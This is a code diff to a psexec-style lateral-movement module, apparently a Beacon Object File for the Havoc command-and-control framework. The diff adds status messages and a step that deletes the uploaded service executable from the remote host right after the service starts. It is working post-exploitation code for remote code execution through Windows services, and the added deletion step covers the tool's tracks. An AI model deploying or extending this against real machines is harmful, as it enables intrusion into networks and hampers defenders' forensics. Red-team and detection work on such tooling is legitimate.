@@ -58,7 +58,7 @@ WINADVAPI  WINBOOL WINAPI ADVAPI32$CloseServiceHandle( SC_HANDLE hSCObject );
 WINADVAPI  WINBOOL WINAPI ADVAPI32$DeleteService( SC_HANDLE hService );
 WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError();
 WINBASEAPI VOID    WINAPI KERNEL32$CloseHandle( HANDLE Handle );
-
+WINBASEAPI BOOL    WINAPI KERNEL32$DeleteFileA( LPCSTR lpFileName );
 /* psexec entrypoint code */ 
 VOID go( PVOID Buffer, ULONG Length )
 {
@@ -122,6 +122,8 @@ VOID go( PVOID Buffer, ULONG Length )
         goto EXIT;
 	}
 
+    BeaconPrintf( HAVOC_CONSOLE_INFO, "Starting Service executable..." );
+
     // TODO: check if service is dead after starting it. maybe we trying to start a buggy one...
     // TODO: add check for ERROR_SERVICE_REQUEST_TIMEOUT
     if ( ! ADVAPI32$StartServiceA( hSvcService, 0, NULL ) ) 
@@ -129,6 +131,13 @@ VOID go( PVOID Buffer, ULONG Length )
 	    BeaconPrintf( HAVOC_CONSOLE_ERRO, "CreateServiceA Failed: %d", KERNEL32$GetLastError() );
         goto EXIT;
 	}
+
+    BeaconPrintf( HAVOC_CONSOLE_INFO, "Successful started Service executable" );
+
+    if ( ! KERNEL32$DeleteFileA( SvcPath ) )
+        BeaconPrintf( HAVOC_CONSOLE_ERRO, "Failed to delete service executable %s from %s Error:[%d]", SvcPath, Host, KERNEL32$GetLastError() );
+    else
+        BeaconPrintf( HAVOC_CONSOLE_INFO, "Deleted service executable %s from %s", SvcPath, Host );
 
     Success = TRUE; 
 
